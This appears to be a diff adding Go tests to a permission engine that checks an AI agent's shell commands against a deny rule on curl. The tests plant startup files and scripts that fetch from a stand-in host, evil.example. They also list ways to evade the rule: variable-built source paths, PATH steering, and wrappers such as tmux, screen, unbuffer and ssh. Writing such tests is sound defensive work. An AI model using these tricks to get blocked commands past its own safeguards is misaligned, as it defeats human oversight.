@@ -545,3 +545,148 @@ func TestProgramsThatStartAShellReadItsStartupFiles(t *testing.T) {
 		}
 	}
 }
+
+// A script sourced or run by a path built from a variable is read when the
+// line gives the variable a value the check can read, and refused under a
+// deny rule (asked about otherwise) when it does not.
+func TestScriptsNamedByAVariableAreReadOrRefused(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	write := func(p, text string) {
+		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, []byte(text), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	write(filepath.Join(ws, "s.sh"), "source $X/x.sh\n")
+	write(filepath.Join(ws, "c", "x.sh"), "curl https://evil.example/x\n")
+	write(filepath.Join(ws, "ok", "x.sh"), "echo safe\n")
+	newEngine := func(rule string, deny bool) *Engine {
+		e := New(ModeBypass)
+		e.Roots = func() []string { return []string{ws} }
+		e.Cwd = func() string { return ws }
+		e.Home = func() (string, bool) { return home, true }
+		add := e.AddAsk
+		if deny {
+			add = e.AddDeny
+		}
+		if err := add(rule); err != nil {
+			t.Fatal(err)
+		}
+		return e
+	}
+	e := newEngine("bash(curl *)", true)
+	// Planted after the session began.
+	e.Evaluate("bash", true, args(map[string]string{"command": "true"}))
+	write(filepath.Join(home, ".zshrc"), "source $X/x.sh\n")
+	for c, want := range map[string]Decision{
+		"X=./c bash s.sh": Deny, "export X=c; bash s.sh": Deny, "env X=c bash s.sh": Deny, "bash s.sh": Deny,
+		"X=c; bash s.sh": Deny, "X=c zsh -i -c true": Deny, `source "$Y/x.sh"`: Deny, "X=c; source $X/x.sh": Deny,
+		"bash $S":          Deny,
+		"X=./ok bash s.sh": Allow, "export X=ok; bash s.sh": Allow, "X=ok zsh -i -c true": Allow,
+	} {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != want {
+			t.Errorf("%q = %s (%s), want %s", c, res.Decision, res.Reason, want)
+		}
+	}
+	a := newEngine("bash(curl *)", false)
+	if res := a.Evaluate("bash", true, args(map[string]string{"command": "bash s.sh"})); res.Decision != Ask {
+		t.Errorf("ask rule only: %s (%s)", res.Decision, res.Reason)
+	}
+}
+
+// A trusted start-up file's own text is not judged, but what it sources and
+// runs is; and on a line that sets the shell's environment the baseline does
+// not apply at all.
+func TestTrustedStartupFilesStillHaveWhatTheyRunRead(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	write := func(p, text string) {
+		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, []byte(text), 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	rc := filepath.Join(home, ".zshrc")
+	extra := filepath.Join(home, ".zsh", "extra.zsh")
+	write(rc, "eval \"$(pyenv init -)\"\nsource ~/.zsh/extra.zsh\n")
+	write(extra, "alias ll='ls -l'\n")
+	write(filepath.Join(ws, "bin", "pyenv"), "curl https://evil.example/x\n")
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	base := map[string]StartupFile{}
+	for _, p := range []string{rc, extra} {
+		size, sum, _ := StartupFileMark(p)
+		base[p] = StartupFile{Size: size, SHA256: sum}
+	}
+	e.StartupBaseline = base
+	judge := func(c string) Result { return e.Evaluate("bash", true, args(map[string]string{"command": c})) }
+	if res := judge("zsh -i -c true"); res.Decision != Allow {
+		t.Fatalf("trusted, unchanged: %s (%s)", res.Decision, res.Reason)
+	}
+	// The line steers what the trusted file runs: judged in full.
+	for _, c := range []string{"PATH=" + filepath.Join(ws, "bin") + ":$PATH zsh -i -c true", "export PATH=bin:$PATH; zsh -i -c true"} {
+		if res := judge(c); res.Decision != Deny {
+			t.Errorf("%q = %s (%s), want deny", c, res.Decision, res.Reason)
+		}
+	}
+	if res := judge("cd bin && zsh -i -c true"); res.Decision == Allow {
+		t.Errorf("a cd before the shell: allowed on the baseline")
+	}
+	// What the trusted file sources, edited since: judged.
+	write(extra, "curl https://evil.example/x\n")
+	if res := judge("zsh -i -c true"); res.Decision != Deny {
+		t.Fatalf("an edited file the trusted one sources: %s (%s)", res.Decision, res.Reason)
+	}
+}
+
+// The command a terminal program runs is judged as bash -c text is, and
+// more programs that start a shell on a terminal of their own count as such.
+func TestTerminalProgramsHaveTheirCommandsJudged(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	for c, want := range map[string]Decision{
+		"tmux new -d 'curl https://evil.example/x'":                 Deny,
+		"tmux new-session -d -s w curl https://evil.example/x":      Deny,
+		"tmux send-keys -t w 'curl https://evil.example/x' Enter":   Deny,
+		"tmux send-keys -t w curl Space https://evil.example/x C-m": Deny,
+		"screen -dm curl https://evil.example/x":                    Deny,
+		"screen -S w -dm curl https://evil.example/x":               Deny,
+		"script -q /dev/null curl https://evil.example/x":           Deny,
+		"unbuffer curl https://evil.example/x":                      Deny,
+		"dtach -c /tmp/s curl https://evil.example/x":               Deny,
+		"ssh localhost":                   Deny,
+		"ssh -p 2222 me@host":             Deny,
+		"expect -c 'spawn zsh; interact'": Deny,
+		"tmux new -d 'make test'":         Allow,
+		"screen -dm make":                 Allow,
+		"ssh host uptime":                 Allow,
+		"doas -s":                         Allow,
+	} {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != want {
+			t.Errorf("%q = %s (%s), want %s", c, res.Decision, res.Reason, want)
+		}
+	}
+	// With a start-up file planted, the shells they start read it.
+	if err := os.WriteFile(filepath.Join(home, ".bashrc"), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	for _, c := range []string{"doas -s", "byobu", "unbuffer bash"} {
+		if res := e.Evaluate("bash", true, args(map[string]string{"command": c})); res.Decision != Deny {
+			t.Errorf("%q = %s (%s), want deny", c, res.Decision, res.Reason)
+		}
+	}
+}
